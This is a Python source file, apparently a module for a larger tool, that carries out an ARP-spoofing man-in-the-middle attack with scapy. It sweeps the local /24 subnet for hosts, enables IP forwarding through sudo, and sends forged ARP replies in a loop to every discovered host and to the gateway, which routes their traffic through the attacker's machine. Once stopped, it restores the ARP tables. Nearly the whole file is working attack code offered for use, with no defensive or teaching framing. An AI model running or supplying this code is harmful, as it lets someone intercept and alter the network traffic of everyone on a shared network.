# mitm_module.py
import time
import scapy.all as scapy
import subprocess
import ipaddress

class MITM:
    def __init__(self, gateway_ip):
        self.gateway_ip = gateway_ip
        self.gateway_mac = None
        self.target_macs = {}
        self.logs = []

    def _log(self, msg):
        # store messages instead of printing
        self.logs.append(msg)

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        answered = scapy.srp(broadcast/arp_request, timeout=1, verbose=False)[0]
        if answered:
            mac = answered[0][1].hwsrc
            return mac
        else:
            self._log(f"[-] Unable to get MAC address for {ip}.")
            return None

    def scan_subnet(self):
        subnet = ipaddress.ip_network(self.gateway_ip + '/24', strict=False)
        self._log(f"[+] Scanning subnet {subnet} for live hosts...")
        arp_request = scapy.ARP(pdst=str(subnet))
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        answered = scapy.srp(broadcast/arp_request, timeout=2, verbose=False)[0]

        hosts = [rcv.psrc for _, rcv in answered]
        self._log(f"[+] Found {len(hosts)} live hosts.")
        return hosts

    def spoof(self, tgt_ip, tgt_mac, spoof_ip):
        pkt = scapy.ARP(op=2, pdst=tgt_ip, hwdst=tgt_mac, psrc=spoof_ip)
        scapy.send(pkt, verbose=False)

    def restore(self, dst_ip, dst_mac, src_ip, src_mac):
        pkt = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac,
                        psrc=src_ip, hwsrc=src_mac)
        scapy.send(pkt, count=4, verbose=False)

    def start(self):
        count = 0
        targets = self.scan_subnet()
        if self.gateway_ip in targets:
            targets.remove(self.gateway_ip)

        self.gateway_mac = self.get_mac(self.gateway_ip)
        if not self.gateway_mac:
            self._log("[-] Could not get gateway MAC. Aborting.")
            return

        for t in targets:
            mac = self.get_mac(t)
            if mac:
                self.target_macs[t] = mac
            else:
                self._log(f"[-] Skipping {t} (unknown MAC)")

        subprocess.call("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward", shell=True)
        self._log("[+] IP forwarding enabled.")

        try:
            while True:
                for t_ip, t_mac in self.target_macs.items():
                    self.spoof(t_ip, t_mac, self.gateway_ip)
                    self.spoof(self.gateway_ip, self.gateway_mac, t_ip)
                count += 2 * len(self.target_macs)
                self._log(f"[+] Sent {count} packets to {len(self.target_macs)} hosts.")
                time.sleep(2)
        except KeyboardInterrupt:
            self._log("[!] Stopping attack, restoring ARP tables...")
            for t_ip, t_mac in self.target_macs.items():
                self.restore(t_ip, t_mac, self.gateway_ip, self.gateway_mac)
                self.restore(self.gateway_ip, self.gateway_mac, t_ip, t_mac)
            subprocess.call("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward", shell=True)
            self._log("[+] IP forwarding disabled.")

    def get_logs(self):
        return self.logs
